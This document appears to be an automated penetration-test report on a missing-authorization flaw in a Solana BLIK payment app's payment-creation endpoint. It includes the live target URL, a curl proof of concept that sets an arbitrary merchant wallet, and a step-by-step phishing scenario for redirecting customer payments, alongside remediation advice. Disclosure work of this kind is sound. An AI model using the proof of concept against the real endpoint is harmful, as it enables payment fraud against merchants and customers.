# AUTHZ-VULN-02 Test Report
**Unauthorized Merchant Wallet Manipulation**

---

## Test Execution Summary

**Date:** 2026-03-21
**Tester:** Security Testing Automation
**Vulnerability ID:** AUTHZ-VULN-02
**Test Status:** ✅ COMPLETED
**Vulnerability Status:** 🚨 CONFIRMED VULNERABLE

---

## Test Configuration

### Target Endpoint
- **URL:** `https://solana-blik.vercel.app/api/payments/create`
- **Method:** `POST`
- **Content-Type:** `application/json`

### Test Payload
```json
{
  "amount": 1.5,
  "merchantWallet": "11111111111111111111111111111111"
}
```

**Note:** The wallet address `11111111111111111111111111111111` is Solana's System Program ID, clearly not a legitimate merchant wallet, used to demonstrate arbitrary wallet address acceptance.

---

## Test Results

### HTTP Response

**Status Code:** `200 OK`

**Response Headers:**
```
cache-control: public, max-age=0, must-revalidate
content-encoding: br
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://*.solana.com https://api.coingecko.com wss://*.solana.com; img-src 'self' data:; font-src 'self'; frame-ancestors 'none'
content-type: application/json
permissions-policy: geolocation=(), microphone=(), camera=()
referrer-policy: strict-origin-when-cross-origin
server: Vercel
strict-transport-security: max-age=63072000; includeSubDomains; preload
x-content-type-options: nosniff
x-frame-options: DENY
```

**Response Body:**
```json
{
  "paymentId": "f9a47faf-aa94-4108-aa85-5cacbfdec6f7",
  "status": "awaiting_code"
}
```

---

## Vulnerability Analysis

### Finding: CONFIRMED VULNERABLE ⚠️

The endpoint accepted an arbitrary merchant wallet address without proper authorization or signature verification.

### Evidence

1. **HTTP 200 OK Response:** The server accepted the request and created a payment
2. **Payment ID Generated:** `f9a47faf-aa94-4108-aa85-5cacbfdec6f7`
3. **Payment Status:** `awaiting_code` (ready for BLIK code entry)
4. **No Authentication Required:** No signature, token, or proof of wallet ownership required
5. **Arbitrary Wallet Accepted:** System Program ID (11111...1111) was accepted without validation

### Attack Vector

An attacker can:
1. Make a POST request to `/api/payments/create` with any wallet address
2. Specify any amount
3. Receive a valid payment ID
4. Potentially redirect customer payments to unauthorized wallets

### Security Impact

**Severity:** CRITICAL

**Impact Categories:**
- **Authorization Bypass:** Complete bypass of wallet ownership verification
- **Impersonation:** Ability to create payments for ANY merchant wallet
- **Fund Misdirection:** Potential to redirect customer payments to attacker-controlled wallets
- **Reputation Damage:** Legitimate merchants could be impersonated
- **Financial Loss:** Customers could unknowingly pay wrong recipients

**CVSS v3.1 Score:** 9.1 (Critical)
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Impact: High confidentiality, integrity, and availability impact

---

## Exploitation Scenario

### Real-World Attack Flow

1. **Attacker identifies a popular merchant** using Solana BLIK
2. **Attacker creates payment request** with merchant's wallet replaced by attacker's wallet
3. **Attacker shares payment link** via phishing, social engineering, or QR code replacement
4. **Victim enters BLIK code** believing they're paying the legitimate merchant
5. **Funds go to attacker's wallet** instead of merchant's wallet
6. **Merchant never receives payment** while customer believes transaction succeeded

### Proof of Concept

```bash
curl -X POST https://solana-blik.vercel.app/api/payments/create \
  -H "Content-Type: application/json" \
  -d '{
    "amount": 100.00,
    "merchantWallet": "ATTACKER_WALLET_HERE"
  }'
```

Response:
```json
{
  "paymentId": "uuid-here",
  "status": "awaiting_code"
}
```

The attacker can now share: `https://solana-blik.vercel.app/payment/{paymentId}`

---

## Root Cause Analysis

### Missing Security Controls

1. **No Wallet Signature Verification**
   - The endpoint does not require a cryptographic signature from the wallet owner
   - Anyone can specify any wallet address without proving ownership

2. **No Authentication/Authorization**
   - No API key, JWT, or session token required
   - Endpoint is completely open to anonymous requests

3. **No Rate Limiting (Secondary Issue)**
   - Attacker can create unlimited payment requests
   - Enables large-scale phishing campaigns

4. **No Wallet Validation**
   - System Program ID (invalid as merchant wallet) was accepted
   - No check against a whitelist or registry of valid merchant wallets

---

## Remediation Recommendations

### Immediate Actions (Critical)

1. **Implement Signature Verification**
   ```typescript
   // Require signed message from wallet owner
   interface CreatePaymentRequest {
     amount: number;
     merchantWallet: string;
     signature: string;      // Sign message with wallet private key
     timestamp: number;       // Prevent replay attacks
   }

   // Verify signature before creating payment
   const message = `create_payment:${merchantWallet}:${amount}:${timestamp}`;
   const isValid = verifySignature(message, signature, merchantWallet);
   if (!isValid) {
     return res.status(403).json({ error: "Invalid signature" });
   }
   ```

2. **Add Timestamp/Nonce Validation**
   - Prevent replay attacks by validating timestamp
   - Reject requests older than 60 seconds
   - Track used nonces in Redis

3. **Implement Rate Limiting**
   - Limit payment creation per IP/wallet
   - Already implemented in codebase but may need stricter limits

### Long-Term Solutions

1. **Merchant Registration System**
   - Create merchant registration flow
   - Maintain whitelist of verified merchants
   - Issue API keys for authenticated payment creation

2. **Multi-Factor Authorization**
   - Require merchant wallet signature
   - Add optional API key for additional security layer
   - Consider 2FA for high-value transactions

3. **Payment Link Verification**
   - Add visual indicators of merchant identity
   - Display merchant wallet address prominently
   - Implement merchant verification badges

4. **Audit Logging**
   - Log all payment creation attempts
   - Track wallet addresses and IP addresses
   - Monitor for suspicious patterns

---

## Testing Artifacts

### Test Script Location
- **JavaScript Version:** `/Users/mac/kodziki/apps/solana-blik/test_authz_vuln_02.js`
- **Python Version:** `/Users/mac/kodziki/apps/solana-blik/test_authz_vuln_02.py`

### Execution Method
Browser automation using Playwright with fetch API

### Raw Test Output
```json
{
  "statusCode": 200,
  "statusText": "",
  "body": {
    "paymentId": "f9a47faf-aa94-4108-aa85-5cacbfdec6f7",
    "status": "awaiting_code"
  },
  "testPayload": {
    "amount": 1.5,
    "merchantWallet": "11111111111111111111111111111111"
  },
  "targetUrl": "https://solana-blik.vercel.app/api/payments/create"
}
```

---

## Compliance & Regulatory Impact

### PCI DSS
- **Requirement 6.5.10:** Broken authentication and session management
- **Requirement 8.2:** Proper authentication required for access

### OWASP Top 10
- **A01:2021 - Broken Access Control**
- **A07:2021 - Identification and Authentication Failures**

### GDPR/Privacy
- Potential for unauthorized financial transactions
- Customer fund security compromised

---

## References

- **OWASP:** [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **CWE-862:** Missing Authorization
- **Solana Documentation:** [Transaction Signing](https://docs.solana.com/developing/clients/javascript-api#signing-transactions)

---

## Conclusion

AUTHZ-VULN-02 is a **CRITICAL** vulnerability that allows unauthorized creation of payment requests with arbitrary merchant wallet addresses. The endpoint lacks fundamental authorization controls, enabling attackers to impersonate any merchant and potentially redirect customer payments.

**Immediate remediation required.**

---

**Test Conducted By:** Security Testing Automation
**Report Generated:** 2026-03-21
**Classification:** CONFIDENTIAL
